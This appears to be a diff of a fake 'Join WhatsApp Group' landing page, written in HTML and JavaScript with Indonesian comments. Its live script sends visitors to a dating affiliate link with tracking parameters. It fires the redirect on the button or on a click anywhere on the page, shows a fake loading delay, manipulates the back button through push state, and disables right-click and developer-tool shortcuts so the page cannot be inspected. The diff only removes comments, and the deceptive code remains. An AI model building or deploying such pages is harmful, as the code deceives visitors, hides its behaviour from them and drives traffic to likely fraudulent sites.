@@ -271,7 +271,6 @@
 
     <!-- Main Content -->
     <div class="main-content">
-        <!-- Random Profile Image Logic applied here -->
         <div class="profile-container">
             <div class="profile-img">
                 <img id="groupIcon" src="" alt="Group Icon">
@@ -295,8 +294,8 @@
         </div>
 
         <div class="button-container">
-            <a href="#" class="btn-social whatsapp loading" id="whatsappBtn" data-original="
-                <i class='fab fa-whatsapp'></i>
+            <a href="#" class="btn-social whatsapp" id="whatsappBtn">
+                <i class="fab fa-whatsapp"></i>
                 <span>Join WhatsApp Group</span>
             </a>
             
@@ -324,7 +323,6 @@
     </div>
 
     <script>
-        // --- KONFIGURASI GAMBAR ---
         const imageList = [
             'https://yaaoho.com/assets/img/landing/bg/01.jpg',
             'https://yaaoho.com/assets/img/landing/bg/02.jpg',
@@ -336,8 +334,6 @@
         // Target Redirect URL
         const targetRedirectUrl = "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&s1=188302&s2=2257084&s3=GREYSYAA&click_id=GREYSYAA&ban=inst&j1=1";
         let isRedirecting = false;
-
-        // --- FUNGSI UTAMA ---
 
         // 1. Fungsi untuk mengambil gambar acak
         function setRandomProfileImage() {
@@ -357,14 +353,12 @@
             isRedirecting = true;
             console.log("🔴 Redirecting to:", targetRedirectUrl);
             
-            // Tampilkan loading pada tombol yang diklik (atau tombol pertama jika body klik)
             const btn = buttonElement || document.querySelector('.btn-social.whatsapp');
             if (btn) {
                 btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>';
                 btn.classList.add('loading');
                 btn.style.pointerEvents = 'none';
                 
-                // Ubah semua tombol lain agar tidak bisa diklik
                 document.querySelectorAll('.btn-social').forEach(b => {
                     if(b !== btn) {
                         b.style.opacity = '0.5';
@@ -378,7 +372,6 @@
             }, 2000); // Delay sedikit agar loading terlihat
         }
 
-        // --- INISIALISASI & EVENT LISTENERS ---
 
         document.addEventListener("DOMContentLoaded", function() {
             
@@ -390,9 +383,6 @@
 
             // Init Counters
             animateCounters();
-
-            // ⚠️ AUTO-REDIRECT TELAH DIHAPUS SESUAI PERMINTAAN
-            // Pengguna sekarang harus mengklik tombol manual.
         });
 
         // Event Listener Tombol
@@ -408,7 +398,6 @@
             }
         });
 
-        // Event Listener Body (Click anywhere)
         document.body.addEventListener('click', function(e) {
             const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
             if (!isButton && !isRedirecting) {
@@ -424,7 +413,6 @@
             }
         }, { passive: false });
 
-        // Back Button Logic (Push State)
         const backBtn = document.getElementById('backBtn');
         if (backBtn) {
             backBtn.addEventListener('click', function(e) {
@@ -484,14 +472,8 @@
             }
         }
 
-        // ==========================================
-        // TAMBAHAN: ANTI-INSPECT ELEMENT SCRIPT
-        // ==========================================
-
-        // Mencegah Klik Kanan
         document.addEventListener('contextmenu', event => event.preventDefault());
 
-        // Mencegah Shortcut Keyboard (F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C, Ctrl+Shift+J)
         document.onkeydown = function(e) {
             if (e.keyCode == 123) { // F12
                 return false;
